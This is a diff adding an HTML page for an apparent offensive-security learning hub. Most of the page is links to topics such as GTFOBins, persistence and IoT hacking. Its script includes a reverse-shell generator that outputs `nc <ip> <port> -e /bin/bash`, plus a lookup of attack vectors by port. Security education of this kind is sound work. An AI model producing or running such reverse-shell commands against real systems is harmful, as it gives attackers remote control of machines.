@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Offensive Security</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: monospace;
+            text-align: center;
+        }
+
+        h1 {
+            color: red;
+        }
+
+        a {
+            color: #00FF00;
+            text-decoration: none;
+            font-size: 20px;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <h1>Offensive Security - Red Pill</h1>
+    <p>Welcome to the offensive security section. Here we learn how to break systems!</p>
+    <a href="cyber.html">Go back to the portal</a>
+      <!-- Reverse Shell Generator Section -->
+    <div class="section">
+        <h2>Reverse Shell Generator</h2>
+         <a href="shellgen.html">Additional Shell Gen </a>
+        <div class="reverse-shell-container">
+            <label for="ip">Target IP Address:</label>
+            <input type="text" id="ip" placeholder="Enter IP Address">
+            <br>
+            <label for="port">Target Port:</label>
+            <input type="text" id="port" placeholder="Enter Port (e.g. 4444)">
+            <br>
+            <button onclick="generateReverseShell()">Generate Reverse Shell</button>
+            <p id="reverseShellOutput"></p>
+        </div>
+    </div>
+
+    <!-- Tactics & Techniques -->
+    <div class="section">
+        <h2>Tactics and Techniques</h2>
+        <div class="technique-card">
+            <h3>Phishing</h3>
+            <p>Phishing is a common tactic used to trick victims into providing sensitive information such as credentials.</p>
+        </div>
+        <div class="technique-card">
+            <h3>Privilege Escalation</h3>
+            <p>Privilege escalation involves gaining elevated access to a system, typically using system vulnerabilities.</p>
+        </div>
+        <div class="technique-card">
+            <h3>Exploitation</h3>
+            <p>Exploitation is the act of taking advantage of a vulnerability in a system to gain unauthorized access.</p>
+        </div>
+    </div>
+
+    <!-- Living Off The Land (LOTL) -->
+    <div class="section">
+        <h2>Living Off The Land (LOTL)</h2>
+	  <a href="lolbin.html">Lets GOOOOOO</a>
+        <p>Living off the land refers to using existing tools and services on the system to perform attacks or escalate privileges, minimizing detection.</p>
+    </div>
+
+<div class="section">
+    <h2>Cyber Encyclopedia</h2>
+    <a href="cyber-encyclopedia.html">Explore Knowledge Base</a>
+    <p>A comprehensive reference guide covering all aspects of cybersecurity, from basic concepts to advanced techniques.</p>
+</div>
+
+<div class="section">
+    <h2>GTFOBins</h2>
+    <a href="updgtf.html">Find Binaries</a>
+    <p>GTFOBins is a curated list of Unix binaries that can be exploited by attackers to bypass local security restrictions.</p>
+</div>
+
+<div class="section">
+    <h2>Operating Systems for Hacking</h2>
+    <a href="osforpt.html">Browse Distros</a>
+    <p>Specialized Linux distributions packed with security tools for penetration testing and ethical hacking.</p>
+</div>
+
+<div class="section">
+    <h2>Bluetooth Hacking</h2>
+    <a href="blth.html">Learn Techniques</a>
+    <p>Methods and tools for testing Bluetooth device security, from simple reconnaissance to advanced exploits.</p>
+</div>
+
+<div class="section">
+    <h2>IoT Hacking</h2>
+    <a href="iot.html">Explore IoT Vulnerabilities</a>
+    <p>Security research and exploitation techniques for Internet of Things devices and embedded systems.</p>
+</div>
+<div class="section">
+    <h2>Mobile App Pentesting Cheatsheet</h2>
+    <a href="mobapp.html">Explore Cheatsheet</a>
+    <p>Security research and exploitation techniques for mobile applications.</p>
+</div>
+<div class="section">
+    <h2>Persistence Techniques</h2>
+    <a href="malper.html">Study Methods</a>
+    <p>Comprehensive guide to how attackers maintain access to compromised systems through various persistence mechanisms.</p>
+</div>
+
+<div class="section">
+    <h2>PowerShell for Ethical Hackers</h2>
+    <a href="pshell.html">Master PowerShell</a>
+    <p>Offensive PowerShell techniques for red teamers and defensive strategies for blue teams to detect malicious scripts.</p>
+</div>
+
+
+<div class="section">
+    <h2>Bug Bounty Resources</h2>
+    <a href="bugbounty.html">Start Hunting</a>
+    <p>Comprehensive guides, tools and methodologies for successful bug bounty hunting and vulnerability research.</p>
+</div>
+
+    <!-- Port Enumeration & Attack Vectors -->
+    <div class="section">
+        <h2>Port Enumeration and Attack Vectors</h2>
+        <div class="port-attack-container">
+            <label for="port-enum">Enter Open Port (e.g., 80, 443, 3389):</label>
+            <input type="text" id="port-enum" placeholder="Enter Port">
+            <button onclick="getPortAttackVector()">Get Attack Vector</button>
+            <p id="portAttackVectorOutput"></p>
+        </div>
+    </div>
+
+    <script>
+        // Reverse Shell Generator Logic
+        function generateReverseShell() {
+            const ip = document.getElementById("ip").value;
+            const port = document.getElementById("port").value;
+
+            if (ip && port) {
+                const reverseShellCommand = `nc ${ip} ${port} -e /bin/bash`;
+                document.getElementById("reverseShellOutput").textContent = `Generated Reverse Shell: ${reverseShellCommand}`;
+            } else {
+                document.getElementById("reverseShellOutput").textContent = "Please enter both an IP and a Port.";
+            }
+        }
+
+        // Port Enumeration Attack Vector Logic
+        function getPortAttackVector() {
+            const port = document.getElementById("port-enum").value;
+
+            if (port === "80") {
+                document.getElementById("portAttackVectorOutput").textContent = "HTTP Server - Potential for Cross-Site Scripting (XSS) or SQL Injection.";
+            } else if (port === "443") {
+                document.getElementById("portAttackVectorOutput").textContent = "HTTPS Server - Possible SSL/TLS vulnerabilities or exploitation of weak cipher suites.";
+            } else if (port === "3389") {
+                document.getElementById("portAttackVectorOutput").textContent = "RDP (Remote Desktop Protocol) - Brute Force or Vulnerability Exploitation (e.g., BlueKeep).";
+            } else {
+                document.getElementById("portAttackVectorOutput").textContent = "No known attack vectors for this port.";
+            }
+        }
+    </script>
+</body>
+</html>
